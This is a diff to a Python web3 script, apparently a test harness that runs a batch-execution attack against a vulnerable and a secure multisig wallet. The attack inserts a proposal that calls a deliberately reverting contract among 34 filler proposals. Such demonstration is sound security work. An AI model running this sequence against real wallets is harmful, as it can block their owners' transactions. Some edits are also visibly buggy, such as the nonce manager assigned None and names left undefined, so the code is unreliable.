@@ -10,13 +10,24 @@ import os
 import json
 import pathlib
 import time
+import threading
 from decimal import Decimal
 from web3 import Web3
 from eth_account import Account
 from dotenv import load_dotenv
+from web3 import exceptions as w3_ex
+from hexbytes import HexBytes
 
 load_dotenv()
 
+# Config
+RECEIPT_TIMEOUT = 11200
+DEFAULT_GAS_LIMIT = 400_000
+PRIORITY_FEE_GWEI = 2
+REPLACE_PRIORITY_FEE_GWEI = 5
+MAX_SEND_RETRIES = 5
+
+# Set Environmental VAriables
 ALCHEMY_URL = os.getenv('ALCHEMY_URL')
 VULNERABLE_ADDRESS = os.getenv('VULNERABLE_ADDRESS')
 SECURE_ADDRESS = os.getenv('SECURE_ADDRESS')
@@ -136,6 +147,191 @@ print(f"Loaded Sinkhole artifact from: {SINKHOLE_ARTIFACT_PATH}")
 print(f"Loaded Ephemeral Deployer artifact from: {DEPLOYER_ARTIFACT_PATH}")
 
 # helpers
+
+def batch_propose_and_get_pids(contract, proposer_acct, tos, vals, datas, nonce_manager):
+    # Ensure datas elements are bytes
+    datas_clean = [d if isinstance(d, (bytes, bytearray, HexBytes)) else HexBytes(d) for d in datas]
+    pc_before = contract.functions.proposalCount().call()
+    # choose batch or fallback
+    if has_batch_fn(contract, "batchPropose"):
+        fn = contract.functions.batchPropose(tos, vals, datas_clean)
+        tx = fn.build_transaction({"from": proposer_acct.address, "chainId": chain_id})
+        txh, rec = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
+        dump_tx_artifact("batch_propose_tx", txh, rec)
+    else:
+        # fallback: send individual propose txs sequentially
+        rec = None
+        for i, (to, val, data) in enumerate(zip(tos, vals, datas_clean)):
+            fn = contract.functions.proposeTransaction(to, val, data)
+            tx = fn.build_transaction({"from": proposer_acct.address, "chainId": chain_id})
+            txh, rec = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
+            dump_tx_artifact(f"propose_fallback_{i}", txh, rec)
+    pc_after = contract.functions.proposalCount().call()
+    start = int(pc_before)
+    end = int(pc_after)
+    pids = list(range(start, end))
+    return pids, txh, rec
+
+def batch_confirm(contract, confirmer_acct, pids_list, nonce_manager):
+    if not pids_list:
+        return None, None
+    if has_batch_fn(contract, "batchConfirm"):
+        fn = contract.functions.batchConfirm(pids_list)
+        tx = fn.build_transaction({"from": confirmer_acct.address, "chainId": chain_id})
+        txh, rec = sign_send(w3, confirmer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
+        dump_tx_artifact("batch_confirm_tx", txh, rec)
+        return txh, rec
+    else:
+        last_rec = None
+        for i, pid in enumerate(pids_list):
+            fn = contract.functions.confirmTransaction(pid)
+            tx = fn.build_transaction({"from": confirmer_acct.address, "chainId": chain_id})
+            txh, rec = sign_send(w3, confirmer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
+            dump_tx_artifact(f"confirm_fallback_{i}", txh, rec)
+            last_rec = rec
+        return txh, last_rec
+
+def batch_execute(contract, executor_acct, pids_list, nonce_manager):
+    if not pids_list:
+        return None, None
+    if has_batch_fn(contract, "batchExecute"):
+        fn = contract.functions.batchExecute(pids_list)
+        tx = fn.build_transaction({"from": executor_acct.address, "chainId": chain_id})
+        txh, rec = sign_send(w3, executor_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
+        dump_tx_artifact("batch_execute_tx", txh, rec)
+        return txh, rec
+    else:
+        last_rec = None
+        for i, pid in enumerate(pids_list):
+            fn = contract.functions.executeTransaction(pid)
+            tx = fn.build_transaction({"from": executor_acct.address, "chainId": chain_id})
+            txh, rec = sign_send(w3, executor_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
+            dump_tx_artifact(f"execute_fallback_{i}", txh, rec)
+            last_rec = rec
+        return txh, last_rec
+
+def has_batch_fn(contract, fn_name):
+    try:
+        return any(fn.get("name") == fn_name for fn in contract.abi if fn.get("type") == "function")
+    except Exception:
+        return False
+
+class NonceManager:
+    def __init__(self, w3, address):
+        self.w3 = w3
+        self.address = w3.to_checksum_address(address)
+        self.lock = threading.Lock()
+        # initialize with pending nonce
+        self._next = self.w3.eth.get_transaction_count(self.address, "pending")
+
+    def next(self):
+        with self.lock:
+            n = self._next
+            self._next += 1
+            return n
+
+    def peek(self):
+        with self.lock:
+            return self._next
+
+    def set_next(self, n):
+        with self.lock:
+            self._next = n
+
+def build_fee_params(w3, priority_gwei=PRIORITY_FEE_GWEI):
+    base = w3.eth.get_block("pending").baseFeePerGas
+    priority = w3.to_wei(str(priority_gwei), "gwei")
+    return {"maxPriorityFeePerGas": priority, "maxFeePerGas": base + priority}
+
+def signed_tx_hash(raw):
+    return Web3.to_hex(Web3.keccak(raw))
+
+def send_signed_raw_and_wait(w3, signed_raw, timeout=RECEIPT_TIMEOUT):
+    """
+    Send raw signed tx bytes. Handles 'already known' and waits for a receipt.
+    Returns (tx_hash, receipt).
+    """
+    raw = signed_raw
+    derived = signed_tx_hash(raw)
+
+    try:
+        txh = w3.eth.send_raw_transaction(raw)
+        txh_hex = txh.hex() if isinstance(txh, (bytes, HexBytes)) else txh
+    except Exception as e:
+        msg = str(e)
+        # handle 'already known' from RPC
+        if "already known" in msg or "known transaction" in msg:
+            txh_hex = derived
+        else:
+            # re-raise for unexpected errors
+            raise
+
+    # wait for receipt (blocking)
+    start = time.time()
+    while True:
+        try:
+            rec = w3.eth.get_transaction_receipt(txh_hex)
+            return txh_hex, rec
+        except w3_ex.TransactionNotFound:
+            if time.time() - start > timeout:
+                raise w3_ex.TimeExhausted(f"Timed out waiting for receipt for {txh_hex}")
+            time.sleep(2)
+
+def sign_send(w3, acct: Account, tx_dict: dict, nonce_manager: NonceManager = None, wait_receipt=True, timeout=RECEIPT_TIMEOUT):
+    """
+    tx_dict: dict WITHOUT nonce (or you can pass one)
+    If nonce_manager provided, it will supply nonce; otherwise uses pending nonce.
+    Returns (tx_hash, receipt or None)
+    """
+    # Ensure chainId present
+    if "chainId" not in tx_dict:
+        tx_dict["chainId"] = w3.eth.chain_id
+
+    # Set nonce
+    if "nonce" not in tx_dict:
+        if nonce_manager:
+            tx_dict["nonce"] = nonce_manager.next()
+        else:
+            tx_dict["nonce"] = w3.eth.get_transaction_count(acct.address, "pending")
+
+    # If gas not set, estimate
+    if "gas" not in tx_dict or not tx_dict["gas"]:
+        try:
+            est = w3.eth.estimate_gas({**tx_dict, "from": acct.address})
+            tx_dict["gas"] = int(est * 1.25)
+        except Exception:
+            tx_dict["gas"] = DEFAULT_GAS_LIMIT
+
+    # set EIP-1559 fee params if not present
+    if "maxFeePerGas" not in tx_dict and "gasPrice" not in tx_dict:
+        fees = build_fee_params(w3, priority_gwei=PRIORITY_FEE_GWEI)
+        tx_dict.update(fees)
+
+    signed = acct.sign_transaction(tx_dict)
+    raw = signed.raw_transaction
+
+    # send and optionally wait
+    txh, rec = None, None
+    try:
+        txh, rec = send_signed_raw_and_wait(w3, raw, timeout=timeout)
+    except Exception as e:
+        # surface meaningful info; caller can decide to replace
+        raise
+
+    if wait_receipt:
+        return txh, rec
+    return txh, None
+
+def replace_tx(w3, acct, original_tx_dict, nonce, reason="replace"):
+    # clone and bump fees
+    tx = original_tx_dict.copy()
+    tx["nonce"] = nonce
+    tx["gas"] = tx.get("gas", DEFAULT_GAS_LIMIT)
+    fees = build_fee_params(w3, priority_gwei=REPLACE_PRIORITY_FEE_GWEI)
+    tx.update(fees)
+    signed = acct.sign_transaction(tx)
+    txh, rec = send_signed_raw_and_wait(w3, signed.raw_transaction, timeout=RECEIPT_TIMEOUT)
+    return txh, rec
 
 def eth(n):
     return Decimal(w3.from_wei(n, 'ether'))
@@ -304,13 +500,15 @@ def deploy_reverting_target_and_propose(wallet_contract, proposer_account, value
     })
     txh_deploy, rec_deploy = send_tx_signed(proposer_account, tx_deploy_data)
     reverter_address = rec_deploy.contractAddress
-    
+    pending = w3.eth.get_transaction_count(proposer_acct.address, "pending")
+    nonce_manager.set_next(max(nonce_manager.peek(), pending))
+
     print(f'   [INFO] Reverting Target deployed at: {reverter_address}')
 
     # 3. Encode the call data for the reverting function
     # Function signature: failImmediately()
     func_signature = w3.keccak(text='failImmediately()').hex()[:10] # 0x + 8 chars
-    call_data = func_signature 
+    call_data = HexBytes(func_signature)
     
     # 4. Propose the transaction to the MultiSig (call_propose needs to be modified 
     #    to handle call_data, or we assume it is a simple ETH transfer that we will
@@ -328,6 +526,9 @@ def deploy_reverting_target_and_propose(wallet_contract, proposer_account, value
             value_eth,          # Value (can be 0 if the function is not payable, but we'll use 0)
             call_data           # Call data for failImmediately()
         )
+        pending = w3.eth.get_transaction_count(proposer_acct.address, "pending")
+        nonce_manager.set_next(max(nonce_manager.peek(), pending))
+
     except TypeError:
         # Fallback if your call_propose only accepts 4 arguments, using a dummy address for the data
         print("WARNING: Using simplified call_propose. Ensure your implementation supports call data.")
@@ -833,58 +1034,156 @@ summary = {'reentrancy': {}, 'unchecked_external': {}, 'batch': {}}
 #   ATTACK EXECUTION (VULNERABLE)
 # ---------------------------------
 
+small_amt_wei = int( (Decimal(TARGET_X_ETH) * Decimal(10**18)) / Decimal(40) )
+owner_addresses = [acct.address for acct in owner_accounts]
+proposer_acct = owner_accounts[0]
+nonce_manager = NonceManager(w3, proposer_acct.address)
+NUM_FILLERS = 17
 EXEC_INDEX = 5
 
 log_step('BATCH GAS EXHAUSTION (Vulnerable)')
 
-# --- 1) Propose many small proposals, then a sinkhole one in the middle. ---
+# --- 1) Propose first batch of small transactions before malicious proposal ---
 print('1. Proposing 17 pre-malicious filler proposals (VMS)')
-owner_addresses = [acct.address for acct in owner_accounts]
 batch_info = []
-small_amt = TARGET_X_ETH / Decimal(40)
-for i in range(17):
-    recipient_address = owner_accounts[(i + 1) % len(owner_accounts)].address
-    txh_prop, rec_prop = call_propose(vuln, owner_accounts[0], recipient_address, small_amt)
-    print('Propose tx:', txh_prop); dump_tx_artifact(f'vul_batch_propose_{i}', txh_prop, rec_prop)
 
-# --- 2) Derive the proposal id (proposalCount - 1) ---
-print('Deriving the proposal id')
-try:
-    pc = vuln.functions.proposalCount().call(); 
-    pid = pc - 1
-    batch_info.append(pid)
-except Exception:
-    pid = 0
+# build arrays
+tos = [owner_accounts[(i + 1) % len(owner_accounts)].address for i in range(NUM_FILLERS)]
+vals = [0 for _ in tos]
+datas = [b'' for _ in tos]
 
-print(f'   {len(batch_info)} filler proposals proposed.')
+# if chain exposes batchPropose, use it; otherwise fallback to individual proposes
+if has_batch_fn(vuln, "batchPropose"):
+    # defensive resync
+    nonce_manager.set_next(max(nonce_manager.peek(), w3.eth.get_transaction_count(proposer_acct.address, "pending")))
+
+    pc_before = vuln.functions.proposalCount().call()
+    fn = vuln.functions.batchPropose(tos, vals, datas)
+    tx = fn.build_transaction({"from": proposer_acct.address, "chainId": w3.eth.chain_id})
+    txh_prop, rec_prop = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
+    dump_tx_artifact('vul_batch_propose_all', txh_prop, rec_prop)
+
+    # --- 2) Derive the proposal id (proposalCount - 1) ---
+    print('Deriving the proposal id')
+    try:
+        pc_after = vuln.functions.proposalCount().call()
+        batch_info = list(range(int(pc_before), int(pc_after)))
+    except Exception as e:
+        print(f"[WARN] could not compute pids after batchPropose: {e}")
+        # fallback: at least push last pid
+        try:
+            pc = vuln.functions.proposalCount().call()
+            batch_info.append(pc - 1)
+        except Exception:
+            pass
+else:
+    # fallback: individual proposes (existing behavior)
+    for i in range(NUM_FILLERS):
+        recipient_address = owner_accounts[(i + 1) % len(owner_accounts)].address
+        fn = vuln.functions.proposeTransaction(recipient_address, small_amt_wei, b"")
+        tx = fn.build_transaction({"from": proposer_acct.address, "chainId": w3.eth.chain_id})
+        try:
+            txh_prop, rec_prop = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
+        except Exception as e:
+            print(f"[ERROR] propose #{i} failed to send or mine: {e}")
+            raise
+
+        print(f'  Propose #{i} tx:', txh_prop)
+        dump_tx_artifact(f'vul_batch_propose_{i}', txh_prop, rec_prop)
+
+        # derive pid
+        try:
+            pc = vuln.functions.proposalCount().call()
+            pid = pc - 1
+        except Exception as e:
+            print(f"[WARN] could not read proposalCount after propose #{i}: {e}; falling back to 0")
+            pid = 0
+        batch_info.append(pid)
+print(f'   {len(batch_info)} filler proposals proposed (VMS).')
 
 # --- 3) Propose the malicious reverting transaction (The Attack - VMS) ---
 print(' Inserting malicious reverting proposal.')
-mal_pid, reverter_addr = deploy_reverting_target_and_propose(vuln, owners[0], Decimal(0), owners) 
+mal_pid, reverter_addr = deploy_reverting_target_and_propose(vuln, owner_accounts[0], Decimal(0), owners) 
 batch_info.append(mal_pid)
 print(f'   Malicious Contract Inserted. Malicious PID: {mal_pid}')
 
 # --- 4) Propose 17 more small proposals (Filler 2 - VMS) ---
 print(' Proposing 17 post-malicious filler proposals.')
-for i in range(17):
-    recipient = owner_addresses[i % len(owner_addresses)]
-    txh_prop, rec_prop = call_propose(vuln, owners[0], recipient, small_amt)
-    pc = vuln.functions.proposalCount().call()
-    pid = pc - 1
-    batch_info.append(pid)
+pending = w3.eth.get_transaction_count(proposer_acct.address, "pending")
+nonce_manager.set_next(max(nonce_manager.peek(), pending))
 
-print(f'   Total proposals in batch: {len(batch_info)}. ')
+# build arrays for post-fillers
+tos_post = [owner_accounts[(i + 1) % len(owner_accounts)].address for i in range(NUM_FILLERS)]
+vals_post = [0 for _ in tos_post]
+datas_post = [b'' for _ in tos_post]
+
+if has_batch_fn(vuln, "batchPropose"):
+    pc_before = vuln.functions.proposalCount().call()
+    fn_post = vuln.functions.batchPropose(tos_post, vals_post, datas_post)
+    tx_post, rec_post = None, None
+    tx = fn_post.build_transaction({"from": proposer_acct.address, "chainId": w3.eth.chain_id})
+    txh_prop, rec_prop = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
+    dump_tx_artifact('vul_batch_propose_post_all', txh_prop, rec_prop)
+
+    print('Deriving the proposal id')
+    try:
+        pc_after = vuln.functions.proposalCount().call()
+        batch_info.extend(list(range(int(pc_before), int(pc_after))))
+    except Exception as e:
+        print(f"[WARN] could not compute post pids after batchPropose: {e}")
+        try:
+            pc = vuln.functions.proposalCount().call()
+            batch_info.append(pc - 1)
+        except Exception:
+            pass
+
+else:
+    for i in range(NUM_FILLERS):
+        recipient_address = owner_accounts[(i + 1) % len(owner_accounts)].address
+        fn = vuln.functions.proposeTransaction(recipient_address, small_amt_wei, b"")
+        tx = fn.build_transaction({"from": proposer_acct.address, "chainId": w3.eth.chain_id})
+        try:
+            txh_prop, rec_prop = sign_send(w3, proposer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
+        except Exception as e:
+            print(f"[ERROR] propose #{i} failed to send or mine: {e}")
+            raise
+
+        print(f'  Propose #{i} tx:', txh_prop)
+        dump_tx_artifact(f'vul_batch_propose_post_{i}', txh_prop, rec_prop)
+
+        print('Deriving the proposal id')
+        try:
+            pc = vuln.functions.proposalCount().call()
+            pid = pc - 1
+        except Exception as e:
+            print(f"[WARN] could not read proposalCount after propose #{i}: {e}; falling back to 0")
+            pid = 0
+        batch_info.append(pid)
 
 # --- 5) Confirm the proposal with the other owners so it becomes executable ---
 print(' Confirming ALL 35 proposals (VMS)')
-for pid in batch_info:
-    for i, acct in enumerate(owners[1:3], start=1):
-        txh_c, rec_c = call_confirm(vuln, acct, pid)
-        print('Confirm tx:', txh_c); dump_tx_artifact(f'vul_batch_execute_confirm_{i}', txh_c, rec_c)
+confirmer1 = owner_accounts[1]
+confirmer2 = owner_accounts[2]
+
+if has_batch_fn(vuln, "batchConfirm"):
+    # use batchConfirm for each confirmer
+    nonce_manager.set_next(max(nonce_manager.peek(), w3.eth.get_transaction_count(confirmer1.address, "pending")))
+    txh_c1, rec_c1 = batch_confirm(vuln, confirmer1, batch_info, nonce_manager)
+    print('Confirm tx (owner1):', txh_c1); dump_tx_artifact('vul_batch_confirm_owner1', txh_c1, rec_c1)
+
+    nonce_manager.set_next(max(nonce_manager.peek(), w3.eth.get_transaction_count(confirmer2.address, "pending")))
+    txh_c2, rec_c2 = batch_confirm(vuln, confirmer2, batch_info, nonce_manager)
+    print('Confirm tx (owner2):', txh_c2); dump_tx_artifact('vul_batch_confirm_owner2', txh_c2, rec_c2)
+else:
+    # fallback to individual confirms (existing behavior)
+    for pid in batch_info:
+        for i, acct in enumerate(owners[1:3], start=1):
+            txh_c, rec_c = call_confirm(vuln, get_owner_account(i), pid)
+            print('Confirm tx:', txh_c); dump_tx_artifact(f'vul_batch_execute_confirm_{i}', txh_c, rec_c)
 
 # --- 6) Execute the batch (VMS) ---
 print(' Executing ALL 35 proposals in a single transaction (VMS)')
-txh_exec_batch_v, rec_exec_batch_v = call_execute_batch(vuln, owners[0], batch_info)
+txh_exec_batch_v, rec_exec_batch_v = call_batch(vuln, owner_accounts[0], batch_info)
 dump_tx_artifact('vul_batch_execute', txh_exec_batch_v, rec_exec_batch_v)
 
 # Get the final executed status (should be False due to the revert)
@@ -908,46 +1207,139 @@ secure_batch_info = []
 
 # --- 1): Propose 17 small proposals (Filler 1 - SMS) ---
 print(' Proposing 17 pre-malicious filler proposals (SMS)')
-for i in range(17):
-    recipient = owner_addresses[i % len(owner_addresses)]
-    txh_prop, rec_prop = call_propose(secure, owners[0], recipient, small_amt)
-    print('Propose tx:', txh_prop); dump_tx_artifact(f'sec_batch_propose_{i}', txh_prop, rec_prop)
 
-# --- 2) Derive the proposal id (proposalCount - 1) ---
-print('Deriving the proposal id')
-pc = secure.functions.proposalCount().call()
-pid = pc - 1
-secure_batch_info.append(pid)
-print(f'   {len(secure_batch_info)} filler proposals proposed.')
+tos_s = [owner_accounts[(i + 1) % len(owner_accounts)].address for i in range(NUM_FILLERS)]
+vals_s = [0 for _ in tos_s]
+datas_s = [b'' for _ in tos_s]
+
+if has_batch_fn(secure, "batchPropose"):
+    sec_nonce_manager.set_next(max(sec_nonce_manager.peek(), w3.eth.get_transaction_count(sec_proposer_acct.address, "pending")))
+    pc_before_s = secure.functions.proposalCount().call()
+    fn_s = secure.functions.batchPropose(tos_s, vals_s, datas_s)
+    tx = fn_s.build_transaction({"from": sec_proposer_acct.address, "chainId": w3.eth.chain_id})
+    txh_prop_s, rec_prop_s = sign_send(w3, sec_proposer_acct, tx, nonce_manager=sec_nonce_manager, wait_receipt=True)
+    dump_tx_artifact('sec_batch_propose_all', txh_prop_s, rec_prop_s)
+    # --- 2) Derive the proposal id (proposalCount - 1) ---
+    try:
+        pc_after_s = secure.functions.proposalCount().call()
+        secure_batch_info = list(range(int(pc_before_s), int(pc_after_s)))
+    except Exception as e:
+        print(f"[WARN] could not compute secure pids after batchPropose: {e}")
+        try:
+            pc = secure.functions.proposalCount().call()
+            secure_batch_info.append(pc - 1)
+        except Exception:
+            pass
+else:
+    for i in range(NUM_FILLERS):
+        recipient_address = owner_accounts[(i + 1) % len(owner_accounts)].address
+        fn_s = secure.functions.proposeTransaction(recipient_address, small_amt_wei, b"")
+        tx_s = fn_s.build_transaction({"from": sec_proposer_acct.address, "chainId": w3.eth.chain_id})
+        try:
+            txh_prop_s, rec_prop_s = sign_send(w3, sec_proposer_acct, tx_s, nonce_manager=sec_nonce_manager, wait_receipt=True)
+        except Exception as e:
+            print(f"[ERROR] secure propose #{i} failed to send or mine: {e}")
+            raise
+
+        print(f'  Secure Propose #{i} tx:', txh_prop_s)
+        dump_tx_artifact(f'sec_batch_propose_{i}', txh_prop_s, rec_prop_s)
+
+        try:
+            pc_s = secure.functions.proposalCount().call()
+            pid_s = pc_s - 1
+        except Exception as e:
+            print(f"[WARN] could not read secure proposalCount after propose #{i}: {e}; falling back to 0")
+            pid_s = 0
+        secure_batch_info.append(pid_s)
+
+print(f'   {len(secure_batch_info)} filler proposals proposed (SMS).')
 
 # --- 3) Propose the malicious reverting transaction (The Attack - SMS) ---
 print(' Inserting malicious reverting proposal on SMS.')
-mal_pid_s, reverter_addr_s = deploy_reverting_target_and_propose(secure, owners[0], Decimal(0), owners) 
+
+mal_pid_s, reverter_addr_s = deploy_reverting_target_and_propose(secure, owner_accounts[0], Decimal(0), owners) 
+pending = w3.eth.get_transaction_count(proposer_acct.address, "pending")
+sec_nonce_manager = nonce_manager.set_next(max(nonce_manager.peek(), pending))
 secure_batch_info.append(mal_pid_s)
+
 print(f'   Malicious Contract Inserted. Malicious PID: {mal_pid_s}')
 
 # --- 4) Propose 17 more small proposals (Filler 2 - SMS) ---
 print(' Proposing 17 post-malicious filler proposals on SMS.')
-for i in range(17):
-    recipient = owner_addresses[i % len(owner_addresses)]
-    txh_prop, rec_prop = call_propose(secure, owners[0], recipient, small_amt)
-    pc = secure.functions.proposalCount().call()
-    pid = pc - 1
-    secure_batch_info.append(pid)
 
-print(f' Total proposals in secure batch: {len(secure_batch_info)}. Malicious PID: {mal_pid_s}')
+# --- IMPORTANT: re-sync nonce_manager after malicious proposal insertion ---
+pending = w3.eth.get_transaction_count(sec_proposer_acct.address, "pending")
+sec_nonce_manager.set_next(max(sec_nonce_manager.peek(), pending))
+
+tos_post_s = [owner_accounts[(i + 1) % len(owner_accounts)].address for i in range(NUM_FILLERS)]
+vals_post_s = [0 for _ in tos_post_s]
+datas_post_s = [b'' for _ in tos_post_s]
+
+if has_batch_fn(secure, "batchPropose"):
+    pc_before_s2 = secure.functions.proposalCount().call()
+    fn_post_s = secure.functions.batchPropose(tos_post_s, vals_post_s, datas_post_s)
+    tx = fn_post_s.build_transaction({"from": sec_proposer_acct.address, "chainId": w3.eth.chain_id})
+    txh_post_s, rec_post_s = sign_send(w3, sec_proposer_acct, tx, nonce_manager=sec_nonce_manager, wait_receipt=True)
+    dump_tx_artifact('sec_batch_propose_post_all', txh_post_s, rec_post_s)
+    try:
+        pc_after_s2 = secure.functions.proposalCount().call()
+        secure_batch_info.extend(list(range(int(pc_before_s2), int(pc_after_s2))))
+    except Exception as e:
+        print(f"[WARN] could not compute secure post pids after batchPropose: {e}")
+        try:
+            pc = secure.functions.proposalCount().call()
+            secure_batch_info.append(pc - 1)
+        except Exception:
+            pass
+else:
+    for i in range(NUM_FILLERS):
+        recipient_address = owner_accounts[(i + 1) % len(owner_accounts)].address
+        fn_s = secure.functions.proposeTransaction(recipient_address, small_amt_wei, b"")
+        tx_s = fn_s.build_transaction({"from": sec_proposer_acct.address, "chainId": w3.eth.chain_id})
+        try:
+            txh_prop_s, rec_prop_s = sign_send(w3, sec_proposer_acct, tx_s, nonce_manager=sec_nonce_manager, wait_receipt=True)
+        except Exception as e:
+            print(f"[ERROR] secure propose #{i} failed to send or mine: {e}")
+            raise
+
+        print(f'  Secure Post Propose #{i} tx:', txh_prop_s)
+        dump_tx_artifact(f'sec_batch_propose_post_{i}', txh_prop_s, rec_prop_s)
+
+        try:
+            pc_s = secure.functions.proposalCount().call()
+            pid_s = pc_s - 1
+        except Exception as e:
+            print(f"[WARN] could not read secure proposalCount after propose #{i}: {e}; falling back to 0")
+            pid_s = 0
+        secure_batch_info.append(pid_s)
+    print(f'  Secure Propose #{i} tx:', txh_prop_s)
+
+
+print(f'   {len(secure_batch_info)} filler proposals proposed (SMS).')
 
 # --- 5) Confirm ALL 35 proposals for execution (SMS) ---
 print(' Confirming ALL 35 proposals (SMS)')
-for pid in secure_batch_info:
-    for i, acct in enumerate(owners[1:3], start=1):
-        txh_c, rec_c = call_confirm(secure, acct, pid)
-        print('Confirm tx:', txh_c); dump_tx_artifact(f'sec_batch_execute_confirm_{i}', txh_c, rec_c)
+confirmer1 = owner_accounts[1]
+confirmer2 = owner_accounts[2]
+
+if has_batch_fn(secure, "batchConfirm"):
+    sec_nonce_manager.set_next(max(sec_nonce_manager.peek(), w3.eth.get_transaction_count(confirmer1.address, "pending")))
+    txh_c1, rec_c1 = batch_confirm(secure, confirmer1, secure_batch_info, sec_nonce_manager)
+    print('Confirm tx (owner1):', txh_c1); dump_tx_artifact('sec_batch_confirm_owner1', txh_c1, rec_c1)
+
+    sec_nonce_manager.set_next(max(sec_nonce_manager.peek(), w3.eth.get_transaction_count(confirmer2.address, "pending")))
+    txh_c2, rec_c2 = batch_confirm(secure, confirmer2, secure_batch_info, sec_nonce_manager)
+    print('Confirm tx (owner2):', txh_c2); dump_tx_artifact('sec_batch_confirm_owner2', txh_c2, rec_c2)
+else:
+    for pid in secure_batch_info:
+        for i, acct in enumerate(owners[1:3], start=1):
+            txh_c, rec_c = call_confirm(secure, get_owner_account(i), pid)
+            print('Confirm tx:', txh_c); dump_tx_artifact(f'sec_batch_execute_confirm_{i}', txh_c, rec_c)
 
 # --- 6) Execute the batch (SMS) ---
 print(' Executing ALL 35 proposals in a single transaction (SMS) - EXPECT REVERT')
 try:
-    txh_exec_batch_s, rec_exec_batch_s = call_execute_batch(secure, owners[0], secure_batch_info)
+    txh_exec_batch_s, rec_exec_batch_s = call_batch(secure, owners[0], secure_batch_info)
     dump_tx_artifact('sec_batch_execute', txh_exec_batch_s, rec_exec_batch_s)
     
     secure_tx_status = rec_exec_batch_s.status
